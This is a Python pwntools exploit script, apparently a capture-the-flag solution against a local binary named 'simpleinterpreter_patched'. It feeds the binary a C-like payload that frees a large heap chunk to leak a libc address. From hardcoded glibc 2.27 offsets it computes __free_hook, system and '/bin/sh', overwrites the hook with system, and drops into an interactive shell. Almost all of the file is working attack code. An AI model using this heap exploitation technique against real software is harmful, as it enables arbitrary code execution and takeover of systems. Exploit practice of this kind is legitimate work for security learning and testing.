from pwn import *
import sys
remote_addr = ["",]
libc = ELF('./libc-2.27.so')
#elf = ELF('')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./simpleinterpreter_patched")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 0

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)

debug()
payload = b'''
    int main() { 
        int *a, *b, libc, free_hook, system, binsh;
        a = malloc(0x420);
        b = malloc(0x10);
        free(a);
        libc = *a - 0x3ebca0;
        printf("libc.address: %p", libc);
        free_hook = libc + 0x3ed8e8;
        system = libc + 0x4f420;
        binsh = libc + 0x1b3d88;
        printf("sys_addr: %p", system);
        read(0, free_hook, 8);
        free(binsh);
    }
'''

sa(b'size: ', str(len(payload)).encode())
sa(b'interpret: ', payload)

ru(b'sys_addr: 0x')
system = int(rc(12), 16)
s(p64(system))

shell()
